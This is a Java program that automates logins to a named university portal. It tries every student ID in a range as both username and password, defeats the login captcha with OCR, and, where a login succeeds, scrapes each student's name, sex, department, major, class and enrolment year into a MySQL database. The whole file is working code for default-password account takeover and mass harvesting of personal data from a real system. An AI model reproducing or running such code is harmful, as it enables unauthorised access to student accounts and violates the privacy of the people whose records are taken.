package getStuInfo;

import com.asprise.ocr.Ocr;
import com.gargoylesoftware.htmlunit.NicelyResynchronizingAjaxController;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.WebRequest;
import com.gargoylesoftware.htmlunit.html.HtmlImage;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.util.Cookie;
import com.gargoylesoftware.htmlunit.util.NameValuePair;
import com.mysql.jdbc.Connection;
import com.mysql.jdbc.PreparedStatement;
import net.sourceforge.tess4j.TesseractException;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;

import javax.imageio.ImageIO;
import javax.imageio.ImageReader;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.net.URL;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.util.*;

/**
 * Created by Intellij IDEA.
 *
 * @author: 霍运浩
 * @date: 2018-08-22
 * @time: 21:45
 */
public class test1 {


    private final static String loginUrl="http://wlzf.cuit.edu.cn/login.aspx";
    private final static String  stuInfoUrl="http://wlzf.cuit.edu.cn/grxx.aspx";
    public static Map<String,String> map=new HashMap<>();
    public static int flag=0;
    public static void main(String[] args) throws IOException {

    String retWord=null;
    FileWriter fw = new FileWriter("F:\\demo.txt");
    for(Integer i=2018011001;i<=2018309500;i++){
        while(true) {
            try {
                retWord = login(getWebClient(), i.toString(), i.toString());
                if (retWord.equals("验证码错误")){
                    System.out.println(retWord);
                } else if (retWord.equals("用户名或密码错误")) {
                    System.out.println(retWord);
                    System.out.println("该专业跑完");
                    i=i+1000;
                    i=Integer.parseInt(i.toString().substring(0,7)+"000");
                    System.out.println(i);
                    fw.write("跳过&&&&&&&&&&&"+i+"\r\n");
                    fw.flush();
                    break;
                } else {
                    System.out.println(retWord);
                    System.out.println("学号为"+i+"正在保存！");
                    System.out.println(map+"*****************保存成功");
                    fw.write("保存***********"+i+"已经保存当前第"+(flag++)+"个！"+"学号为"+i+"正在保存！"+"\r\n");
                    fw.flush();
                    break;
                }
            } catch (IOException e) {
                e.printStackTrace();
            } catch (InterruptedException e) {
                e.printStackTrace();
            } catch (SQLException e) {
                e.printStackTrace();
            } catch (ClassNotFoundException e) {
                e.printStackTrace();
            } catch (TesseractException e) {
                e.printStackTrace();
            }
        }
        }
    }
    public static String login(WebClient webClient,String username,String password) throws IOException, InterruptedException, SQLException, ClassNotFoundException, TesseractException {

        WebRequest webRequest=new WebRequest(new URL(loginUrl));
        HtmlPage page=webClient.getPage(webRequest);
        webClient.waitForBackgroundJavaScript(3000);
        HtmlImage image= (HtmlImage) page.getElementById("Image1");
        //下载验证码
        File file=getYZMImg(image);
        //设置请求主体
        webRequest.setRequestParameters(setRequestBody(page,file,username,password));
        webClient.addRequestHeader("Content-Type","application/x-www-form-urlencoded;charset=UTF-8");
        webClient.addRequestHeader("Referer","http://wlzf.cuit.edu.cn/login.aspx");
        webClient.addRequestHeader("Origin","http://wlzf.cuit.edu.cn");
        webClient.addRequestHeader("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36");
        Set<Cookie> cookies = webClient.getCookieManager().getCookies();;
        for (Cookie c : cookies) {
            webClient.getCookieManager().addCookie(c);
        }
        HtmlPage page1=webClient.getPage(webRequest);
        if(page1.asXml().contains("验证码错误")){

            return "验证码错误";
        }
        else if(page1.asXml().contains("用户名或密码错误"))
        {
            return "用户名或密码错误";
        }
        getStuinfo(webClient);
        webClient.close();
        return "登录成功";

    }

    /**
     * 暂且不用
     * @param filepicF
     * @return
     */
    public static String readImage(File filepicF){
        String s = null;
        Ocr.setUp(); // one time setup
        Ocr ocr = new Ocr(); // create a new OCR engine
        ocr.startEngine("eng", Ocr.SPEED_FASTEST); // English
        s = ocr.recognize(new File[]{filepicF}, Ocr.RECOGNIZE_TYPE_TEXT, Ocr.OUTPUT_FORMAT_PLAINTEXT);
        System.out.println("Result: ***************************************************--" + s);
        System.out.println("图片文字为:*********************************************** --" + s.replace(",", "").replace("i", "1").replace(" ", "").replace("'", "").replace("o", "0").replace("O", "0").replace("g", "6").replace("B", "8").replace("s", "5").replace("z", "2"));
        ocr.stopEngine();
        return s;
    }
    /**
     * 初始化WebClien
     * @return
     */
    public static WebClient getWebClient(){
        WebClient webClient = new WebClient();
        webClient.getOptions().setUseInsecureSSL(true);
        webClient.getCookieManager().setCookiesEnabled(true);// 开启cookie管理
        webClient.getOptions().setCssEnabled(false);
        webClient.getOptions().setJavaScriptEnabled(true);
        webClient.getOptions().setRedirectEnabled(true);
        webClient.getOptions().setThrowExceptionOnScriptError(false);
        webClient.getOptions().setThrowExceptionOnFailingStatusCode(false);
        webClient.setAjaxController(new NicelyResynchronizingAjaxController());
        return webClient;
    }
    /**
     * 下载验证码
     * @param image
     * @return
     * @throws IOException
     */
    public static File getYZMImg(HtmlImage image) throws IOException {
        ImageReader imageReader = image.getImageReader();
        BufferedImage bufferedImage = imageReader.read(0);
        File file=new File("F:\\\\imgRow\\img-"+UUID.randomUUID().toString().replace("-", "").substring(0,7)+".png");
        ImageIO.write(bufferedImage, "png", file);
        return file;
    }

    /**
     * 设置请求主体
     * @param page
     * @param file
     * @return
     */
    public static List<NameValuePair> setRequestBody(HtmlPage page,File file,String username,String password) throws IOException, TesseractException {
        List<NameValuePair> List=new ArrayList<NameValuePair>();
        List.add(new NameValuePair("__EVENTTARGET",page.getHtmlElementById("__EVENTTARGET").getAttribute("value")));
        List.add(new NameValuePair("__EVENTARGUMENT",page.getHtmlElementById("__EVENTARGUMENT").getAttribute("value")));
        List.add(new NameValuePair("__LASTFOCUS",""));
        List.add(new NameValuePair("ScriptManager1","UpdatePanel1|ImageButton1"));
        List.add(new NameValuePair("__VIEWSTATE",page.getHtmlElementById("__VIEWSTATE").getAttribute("value")));
        List.add(new NameValuePair("__VIEWSTATEGENERATOR",page.getHtmlElementById("__VIEWSTATEGENERATOR").getAttribute("value")));
        List.add(new NameValuePair("__EVENTVALIDATION",page.getHtmlElementById("__EVENTVALIDATION").getAttribute("value")));
        List.add(new NameValuePair("txt_yhm", username));
        List.add(new NameValuePair("txt_pwd", password));
        String imgWord=NarrowImage.imgExd(file);
        List.add(new NameValuePair("txt_yzm", imgWord.trim()));
        List.add(new NameValuePair("__ASYNCPOST", "true"));
        List.add(new NameValuePair("ImageButton1.x", "100"));
        List.add(new NameValuePair("ImageButton1.y", "15"));
        return List;
    }
    /**
     *得到学生的信息
     * @param webClient
     * @throws IOException
     */
    public static void getStuinfo(WebClient webClient) throws IOException, SQLException, ClassNotFoundException {
        System.out.println("登录成功");
        HtmlPage page2= webClient.getPage(stuInfoUrl);
        Map<String,String> stringStringMap=new HashMap<>();
        Document document=Jsoup.parse(page2.asXml());
        Elements elements=document.getElementsByTag("tbody");
        String[] strings=elements.select("span").text().trim().split(" ");
        for(int i=0;i<strings.length;i++){
            stringStringMap.put("姓名",strings[0]);
            stringStringMap.put("学号",strings[1]);
            stringStringMap.put("性别",strings[2]);
            stringStringMap.put("院系",strings[3]);
            stringStringMap.put("专业",strings[4]);
            stringStringMap.put("班级",strings[5]);
            stringStringMap.put("入学年度",strings[6]);
        }
        saveStuInfo(stringStringMap);/**/
    }
    /**
     * 连接数据库保存数据
     * @param stringStringMap
     */
    public static void saveStuInfo(Map<String,String> stringStringMap) throws ClassNotFoundException, SQLException {
        Connection conn ;
        String sql="insert into stu_info values (?,?,?,?,?,?,?,?)";
        String username="root";
        String password="";
        PreparedStatement stmt;
        String conn_str = "jdbc:mysql://localhost:3306/coj?characterEncoding=utf-8";
        Class.forName("com.mysql.jdbc.Driver");
        conn = (Connection) DriverManager.getConnection(conn_str,username,password);
        stmt = (PreparedStatement) conn.prepareStatement(sql);
        stmt.setString(1,UUID.randomUUID().toString().replace("-",""));
        stmt.setString(2,stringStringMap.get("姓名").toString());
        stmt.setString(3,stringStringMap.get("性别").toString());
        stmt.setString(4,stringStringMap.get("专业").toString());
        stmt.setString(5,stringStringMap.get("院系").toString());
        stmt.setString(6,stringStringMap.get("班级").toString());
        stmt.setString(7,stringStringMap.get("入学年度").toString());
        stmt.setString(8,stringStringMap.get("学号").toString());
        stmt.executeUpdate();
        map=stringStringMap;
    }
}
